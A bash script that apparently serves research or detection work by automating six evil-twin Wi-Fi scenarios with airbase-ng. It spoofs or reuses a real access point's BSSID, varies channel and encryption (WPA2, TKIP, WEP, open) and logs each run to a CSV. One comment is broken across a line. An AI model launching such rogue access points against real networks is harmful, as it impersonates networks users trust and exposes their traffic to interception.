#!/bin/bash

# === Automated Evil Twin Simulation Runner ===

LOG_FILE="evil_twin_log.csv"
DURATION=300  # Duration in seconds for each attack
SLEEP_BETWEEN=10  # Seconds to wait between attacks

# Ensure log file exists
if [[ ! -f "$LOG_FILE" ]]; then
    echo "start_time,end_time,interface,ssid,bssid,channel,encryption,mode" > "$LOG_FILE"
fi

# Prompt for monitor interface and real AP channel
read -rp "Enter monitor interface (e.g., wlan1mon): " IFACE
read -rp "Enter real AP channel (1–11): " ORIG_CH

REAL_BSSID="BC:A5:11:DF:04:7E"     # Replace with real AP BSSID
SPOOFED_BSSID="66:77:88:99:AA:BB"  # Example spoofed BSSID
SSID_NAME="malmalmal"

for MODE in {1..6}; do
    case $MODE in
        1)
            CH="$ORIG_CH"
            BSSID="$REAL_BSSID"
            ENC_TAG="-Z 4"
            ENC_DESC="WPA2-PSK/CCMP"
            ;;
        2)
            CH="$ORIG_CH"
            BSSID="$SPOOFED_BSSID"
            ENC_TAG="-Z 4"
            ENC_DESC="WPA2-PSK/CCMP"
            ;;
        3)
            BSSID="$REAL_BSSID"
            # Pick different channel (wrap around if ORIG_CH = 11)
            if [[ "$ORIG_CH" -eq 11 ]]; then CH=1; else CH=$((ORIG_CH + 1)); fi
            ENC_TAG="-Z 4"
            ENC_DESC="WPA2-PSK/CCMP"
            ;;
        4)
            CH="$ORIG_CH"
            BSSID="$REAL_BSSID"
            ENC_TAG="-Z 2"
            ENC_DESC="WPA2-PSK/TKIP"
            ;;
        5)
            CH="$ORIG_CH"
            BSSID="$SPOOFED_BSSID"
            ENC_TAG="-z 1"
            ENC_DESC="WEP40"
            ;;
        6)
            CH="$ORIG_CH"
            BSSID="$SPOOFED_BSSID"
            ENC_TAG=""
            ENC_DESC="OPEN (no encryption)"
            ;;
    esac

    echo ""
    echo "[+] Running scenario $MODE..."
    echo "    SSID:       $SSID_NAME"
    echo "    BSSID:      $BSSID"
    echo "    Channel:    $CH"
    echo "    Encryption: $ENC_DESC"
    echo "    Duration:   $DURATION seconds"
    echo ""

    START_TIME=$(date +"%Y-%m-%d %H:%M:%S")

    # Launch RAP in background
    airbase-ng -e "$SSID_NAME" -a "$BSSID" -c "$CH" $ENC_TAG "$IFACE" > /dev/null 2>&1 &
    RAP_PID=$!

    # Let thekali
     attack run for DURATION seconds
    sleep "$DURATION"

    # Kill the RAP process
    kill "$RAP_PID" 2>/dev/null
    wait "$RAP_PID" 2>/dev/null

    END_TIME=$(date +"%Y-%m-%d %H:%M:%S")
    echo "$START_TIME,$END_TIME,$IFACE,$SSID_NAME,$BSSID,$CH,\"$ENC_DESC\",$MODE" >> "$LOG_FILE"

    echo "[*] Logged scenario $MODE to $LOG_FILE"
    echo "[*] Sleeping $SLEEP_BETWEEN seconds before next test..."
    sleep "$SLEEP_BETWEEN"
done

echo "[+] All scenarios completed."
